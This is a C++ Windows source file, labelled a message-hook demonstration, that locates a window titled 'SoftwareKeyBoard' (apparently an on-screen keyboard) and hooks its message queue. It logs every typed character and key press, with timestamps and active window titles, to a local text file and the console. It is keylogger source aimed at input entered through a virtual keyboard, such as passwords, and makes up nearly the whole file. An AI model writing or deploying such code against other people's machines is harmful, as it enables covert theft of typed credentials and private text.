#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <chrono>
#include <ctime>

// Global file for logging captured keystrokes
std::ofstream logFile;

// Hook handle
HHOOK messageHook;
HWND targetWindow = NULL;

// Convert virtual key code to string representation
std::string getKeyName(DWORD vkCode) {
    char keyName[256] = {0};
    DWORD scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    // Handle special keys
    switch (vkCode) {
        case VK_RETURN:
            return "Enter";
        case VK_ESCAPE:
            return "Escape";
        case VK_BACK:
            return "Backspace";
        case VK_TAB:
            return "Tab";
        case VK_SPACE:
            return "Space";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "Shift";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "Control";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "Alt";
        // Add more special keys as needed
        default:
            // For standard keys, get the key name from the system
            GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));
            if (strlen(keyName) > 0) {
                return keyName;
            }
            // For other keys just return the virtual key code
            return "Key(" + std::to_string(vkCode) + ")";
    }
}

std::string getCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    std::time_t time = std::chrono::system_clock::to_time_t(now);
    
    std::string timeStr = std::ctime(&time);
    // Remove newline
    if (!timeStr.empty() && timeStr[timeStr.length() - 1] == '\n') {
        timeStr.erase(timeStr.length() - 1);
    }
    
    return timeStr;
}

// Callback function for window enumeration
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowText[256];
    GetWindowTextA(hwnd, windowText, sizeof(windowText));
    
    // Find the SoftwareKeyBoard window
    if (strstr(windowText, "SoftwareKeyBoard") != NULL) {
        targetWindow = hwnd;
        std::cout << "Found SoftwareKeyBoard window: " << windowText << " (HWND: " << hwnd << ")" << std::endl;
        if (logFile.is_open()) {
            logFile << getCurrentTimestamp() << " - Found SoftwareKeyBoard window: " 
                   << windowText << " (HWND: " << hwnd << ")" << std::endl;
        }
        
        // Stop enumeration as we found our target
        return FALSE;
    }
    
    return TRUE; // Continue enumeration
}

// Callback function that processes window messages
LRESULT CALLBACK MessageProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // If nCode is less than zero, pass to next hook
    if (nCode < 0) {
        return CallNextHookEx(messageHook, nCode, wParam, lParam);
    }
    
    // Process window messages
    if (nCode == HC_ACTION) {
        MSG* msg = (MSG*)lParam;
        
        // Check if the message is for our target window
        if (msg->hwnd == targetWindow || GetParent(msg->hwnd) == targetWindow) {
            // Log WM_CHAR messages which represent character input
            if (msg->message == WM_CHAR) {
                char c = (char)msg->wParam;
                std::string displayChar = isprint(c) ? std::string(1, c) : "ASCII(" + std::to_string((int)c) + ")";
                
                HWND foregroundWindow = GetForegroundWindow();
                char windowTitle[256] = {0};
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                // Log the key event
                if (logFile.is_open()) {
                    logFile << getCurrentTimestamp() << " - " 
                            << "WM_CHAR: " << displayChar << " | "
                            << "Window: " << windowTitle << std::endl;
                }
                
                // Print to console as well
                std::cout << "WM_CHAR: " << displayChar << " (Window: " << windowTitle << ")" << std::endl;
            }
            // Also log keydown/keyup messages
            else if (msg->message == WM_KEYDOWN || msg->message == WM_SYSKEYDOWN) {
                DWORD vkCode = (DWORD)msg->wParam;
                std::string keyName = getKeyName(vkCode);
                
                HWND foregroundWindow = GetForegroundWindow();
                char windowTitle[256] = {0};
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                // Log the key event
                if (logFile.is_open()) {
                    logFile << getCurrentTimestamp() << " - " 
                            << "KeyDown: " << keyName << " | "
                            << "Window: " << windowTitle << " | "
                            << "VK Code: " << vkCode << std::endl;
                }
                
                // Print to console as well
                std::cout << "KeyDown: " << keyName << " (Window: " << windowTitle << ")" << std::endl;
            }
            else if (msg->message == WM_KEYUP || msg->message == WM_SYSKEYUP) {
                DWORD vkCode = (DWORD)msg->wParam;
                std::string keyName = getKeyName(vkCode);
                
                HWND foregroundWindow = GetForegroundWindow();
                char windowTitle[256] = {0};
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                // Log the key event
                if (logFile.is_open()) {
                    logFile << getCurrentTimestamp() << " - " 
                            << "KeyUp: " << keyName << " | "
                            << "Window: " << windowTitle << " | "
                            << "VK Code: " << vkCode << std::endl;
                }
                
                // Print to console as well
                std::cout << "KeyUp: " << keyName << " (Window: " << windowTitle << ")" << std::endl;
            }
        }
    }
    
    // Pass to next hook
    return CallNextHookEx(messageHook, nCode, wParam, lParam);
}

int main() {
    std::cout << "Message Hook Demonstration - Captures events from SoftwareKeyBoard" << std::endl;
    std::cout << "==================================================================" << std::endl;
    
    // Open log file
    logFile.open("keyboard_hook_log.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }
    
    logFile << "\n\n" << getCurrentTimestamp() << " - Message hook started" << std::endl;
    
    // Find the SoftwareKeyBoard window
    std::cout << "Looking for SoftwareKeyBoard window..." << std::endl;
    EnumWindows(EnumWindowsProc, 0);
    
    if (targetWindow == NULL) {
        std::cerr << "SoftwareKeyBoard window not found! Make sure it's running." << std::endl;
        logFile << getCurrentTimestamp() << " - SoftwareKeyBoard window not found!" << std::endl;
        logFile.close();
        return 1;
    }
    
    // Set up message hook
    messageHook = SetWindowsHookEx(WH_GETMESSAGE, MessageProc, NULL, GetWindowThreadProcessId(targetWindow, NULL));
    
    if (messageHook == NULL) {
        std::cerr << "Failed to install message hook!" << std::endl;
        logFile << getCurrentTimestamp() << " - Failed to install message hook. Error code: " 
                << GetLastError() << std::endl;
        logFile.close();
        return 1;
    }
    
    std::cout << "Message hook installed successfully." << std::endl;
    std::cout << "Listening for messages from SoftwareKeyBoard..." << std::endl;
    std::cout << "Press Ctrl+C to exit" << std::endl;
    
    // Message loop to keep application running and processing keyboard events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Clean up
    UnhookWindowsHookEx(messageHook);
    logFile << getCurrentTimestamp() << " - Message hook stopped" << std::endl;
    logFile.close();
    
    return 0;
} 
